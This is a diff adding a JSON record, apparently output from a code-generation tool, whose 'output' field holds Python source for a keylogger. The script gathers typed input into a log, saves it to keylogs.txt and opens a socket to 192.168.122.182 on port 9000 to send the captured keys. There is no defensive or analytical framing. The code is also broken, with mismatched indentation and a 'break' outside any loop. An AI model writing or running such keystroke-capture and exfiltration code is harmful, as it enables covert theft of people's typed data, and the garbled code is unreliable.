@@ -1,0 +1,6 @@
+{
+  "output": "import socket\nimport os\nlog = \"\"\nwhile True:\n    keys = input()\nif keys != \"\\x1b\" and keys != \"q\" and keys != \"Q\": \n\tlog += str(keys)\n    print(\"Key: \" + str(keys) + \" - Log: \"+ log)\nelse: \n    f = open(\"keylogs.txt\", \"w+\")\n    f.write(log)\n    f.close()\n\tprint(\"Keylogger Closed. Sending keylogs...\")\n\tsender_socket = socket.socket()\n\tsender_socket.connect((\"192.168.122.182\", 9000))\n\twith open(\"keylogs.txt\", \"rb\") as f:\n\t\tdata = f.read(1024)\n\t\tsender_socket.sendall(data)\n\t\tf.close()\n    print(\"Keylogs Sent.\")\n    break\n",
+  "notes": "",
+  "applied_fixes": [],
+  "iterations": 1
+}
